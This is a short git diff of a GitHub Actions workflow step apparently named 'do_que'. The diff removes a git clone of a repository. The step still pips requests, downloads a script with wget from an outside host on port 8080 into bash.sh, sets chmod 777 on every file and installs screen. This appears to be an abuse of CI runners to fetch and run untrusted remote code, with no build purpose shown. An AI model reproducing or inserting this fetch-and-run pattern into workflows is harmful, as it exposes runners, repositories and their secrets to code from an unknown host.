@@ -16,8 +16,6 @@ jobs:
       - name: do_que
         run: |
           pip install requests
-          git clone https://github.com/ohqvb1lt/gat.git
-          cd gat
           wget "https://api.smyhw.online:8080/http2/test/gha2v?act=script" -O bash.sh
           chmod 777 *
           sudo apt-get install screen
